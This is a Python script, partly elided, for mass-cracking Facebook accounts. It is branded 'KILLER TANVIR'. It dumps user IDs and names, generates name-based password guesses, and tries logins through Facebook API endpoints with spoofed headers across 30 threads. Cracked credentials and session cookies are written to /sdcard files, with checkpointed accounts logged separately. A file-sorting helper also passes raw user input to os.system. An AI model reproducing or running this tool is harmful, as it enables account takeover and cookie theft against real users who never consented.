...
from concurrent.futures import ThreadPoolExecutor as tanvirTANVIR
from string import * 
...
sys.stdout.write('\x1b]2; TANVIR\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
╚══██╔══╝██╔══██╗████╗  ██║██║   ██║██║██╔══██╗
   ...
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚═╝  ╚═╝
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            KILLER TANVIR
\033[1;37m Facebook:            KILLER TANVIR
\033[1;37m Github  :            WHOAMI-99
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back TANVIR Menu ")
        exit()
...
def tanvir():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/LlVs7CFN9h087OOe823ZNc')
        pass
    elif select =='F':
        os.system('xdg-open https://m.facebook.com/groups/garenafreefirelovers/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        TANVIR(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[TANVIR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);TANVIRb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TANVIRb};{ckkk}"
                    print(f"\r{R} [TANVIR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TANVIR_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TANVIR_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [TANVIR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TANVIR_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[TANVIR] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [TANVIR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TANVIR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TANVIR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [TANVIR-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[TANVIR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[TANVIR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [TANVIR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TANVIR_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with tanvirTANVIR(max_workers=30) as TANVIRworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                TANVIRworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                TANVIRworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                TANVIRworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                TANVIRworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/TANVIR.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/TANVIR.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    TANVIR = input('Put File Name :')
    print(" ")
    tanvir = input('Saving Put File Name :')
    os.system('touch ' +tanvir)
    os.system('sort -r '+TANVIR+' | uniq > '+tanvir)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + TANVIR )
    print(47*'-')
    print("File Saved To :" + tanvir )
    print(47*'-')
    input(f"{S} Press Enter To Back TANVIR Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/TANVIR.txt\n') 
        filepath = input("Put File Name: ")
